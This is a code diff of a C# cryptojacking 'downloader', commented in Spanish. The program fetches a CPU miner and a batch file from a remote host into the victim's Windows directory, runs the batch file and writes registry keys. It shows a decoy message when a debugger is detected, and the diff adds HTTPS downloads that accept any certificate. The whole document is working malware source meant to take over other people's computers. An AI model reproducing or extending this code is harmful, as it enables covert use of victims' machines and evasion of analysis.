@@ -13,6 +13,7 @@ using System.IO;
 //Para DllImport; para el debuggerPresent
 using System.Runtime.InteropServices;
 
+
 namespace downloader
 {
     class Downloader
@@ -25,7 +26,7 @@ namespace downloader
          * pool utilizada -> stratum+tcp://nya.kano.is:3333
          * de KanoPool http://www.kano.is/
          */
-        static string remoteHost = "192.168.0.18";
+        static string remoteHost = "abpe.os";
         static string criptomining_file = "cpuminer-gw64-corei7.exe";
         static string bat_file = "cript.bat";
         static int remotePort = 8000;
@@ -45,26 +46,31 @@ namespace downloader
              *  Metodo para descargar un archivo en dest_file que es una
              *  ruta dentro de la computadora victima
              */
-            UriBuilder myUri = new UriBuilder("http", remoteHost, remotePort, server_file);
+            // Descargas a traves de HTTPS
+            UriBuilder myUri = new UriBuilder("https", remoteHost, remotePort, server_file);
             Uri uri_prueba = myUri.Uri;
             //Instancia para hacer la descarga
             WebClient webCli = new WebClient();
+            Console.Write(uri_prueba);
             //descarga del archivo a un archivo en la computadora
             webCli.DownloadFile(uri_prueba, @dest_file);
             //webCli.DownloadFile(uri_prueba, @"c:\\Windows\\serv2.txt");
-            //Console.ReadKey();
         }
 
         static void downloaderM()
         {
             /*
-             * Este metodo es el downloader en si
+             * Este metodo es el downloader en si. Establece una conexion cifrada para descargar
+             * el criptominig y el archivo bat que ejecuta el criptomining descargado
              */
-            //Se contruye la URI para descargar el criptominer
-            // De esta manera el criptomining debe estar en la raiz del host como
-            //http://192.168.0.18:8000/criptominig.exe
-            //string dest_file = "cript.exe", bat_dest_file = "cript.bat";
 
+            // permite cualquier version del protocolo TLS
+            // tomado de https://stackoverflow.com/questions/22251689/make-https-call-using-httpclient
+            System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
+            // acepta el certificado invalido (self-signed) 
+            // tomado de https://stackoverflow.com/questions/12506575/how-to-ignore-the-certificate-check-when-ssl
+            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
+            
             // Descargamos el criptomining
             if (!File.Exists(Environment.GetEnvironmentVariable("windir") + "\\" + dest_file))
             {
@@ -83,9 +89,7 @@ namespace downloader
             // Ya que se necesitan los archivos para ser ejecutados, se decidio no hacer las
             // descargas en otro hilo
 
-            // Ejecuta el archivo bat una vez descargado
-            // Es necesario que el bat se encuentre en WINDIR, o poner ruta absoluta
-            // Process.Start(bat_dest_file);
+            
         }
 
         static void create_reg_keys()
@@ -113,6 +117,7 @@ namespace downloader
 
         static void Main(string[] args)
         {
+            //Microsoft.VisualStudio.
             // Atributo para hacer referencia al debugger
             bool isDebuggerPresent = false;
             // Se valida si es ejecutado por un debuggeador y se altera el valor del atributo
@@ -122,18 +127,16 @@ namespace downloader
             if (isDebuggerPresent)
             {
                 Console.WriteLine("ESCRIBIR UNA CADENA RELACIONADA AL SENUELO");
-                Console.Write(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
-                Console.ReadLine();
             }
             // Si no es debuggeado, se ejecuta el downloader
             else
             {
                 downloaderM();
+                // Ejecuta el archivo bat una vez descargado
+                // Es necesario que el bat se encuentre en WINDIR, o poner ruta absoluta
+                Process.Start(bat_dest_file);
                 create_reg_keys();
             }
-
-            // Para eliminar archivos pdb
-            // http://thecyberrecce.net/2015/05/08/removing-debugging-information-from-visual-cc-projects/
         }
     }
 }
